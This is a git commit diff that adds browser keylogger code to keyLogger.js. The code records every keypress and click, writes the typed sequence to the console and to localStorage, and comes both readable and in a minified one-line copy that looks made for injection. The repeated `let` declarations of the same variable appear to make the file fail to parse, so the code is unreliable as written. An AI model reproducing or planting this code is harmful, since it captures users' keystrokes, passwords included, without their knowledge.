f3343f0ab787a2443796d3d3431d1759755e8c65
Ashraful Hoda <141621146+ashrafulHodaJs@users.noreply.github.com>
2024-04-06 20:20:54 +0530

    Update keyLogger.js

--- keyLogger.js
+++ keyLogger.js
@@ -12,3 +12,27 @@ document.addEventListener('keydown', function(event) {
         keyStrokeString = '';
     }
 });
+/*************2nd iteration****************/
+let keyStrokeString = "";
+
+function handleKeypress(event) {
+  if (event.key !== "Enter") {
+    keyStrokeString += event.key;
+  } else {
+    console.log("Key sequence:", keyStrokeString);
+    localStorage.setItem("Key sequence:", keyStrokeString);
+    keyStrokeString = "";
+  }
+}
+
+function handleClick(event) {
+  console.log();
+  console.log("Mouse clicked, Key sequence:", keyStrokeString);
+  localStorage.setItem("Mouse clicked, Key sequence:", keyStrokeString);
+  keyStrokeString = "";
+}
+
+document.addEventListener("keypress", handleKeypress);
+document.addEventListener("click", handleClick);
+/*************condensed 2nd **************/
+let keyStrokeString="";function handleKeypress(e){"Enter"!==e.key?keyStrokeString+=e.key:(console.log("Key sequence:",keyStrokeString),localStorage.setItem("Key sequence:",keyStrokeString),keyStrokeString="")}function handleClick(e){console.log(),console.log("Mouse clicked, Key sequence:",keyStrokeString),localStorage.setItem("Mouse clicked, Key sequence:",keyStrokeString),keyStrokeString=""}document.addEventListener("keypress",handleKeypress),document.addEventListener("click",handleClick);
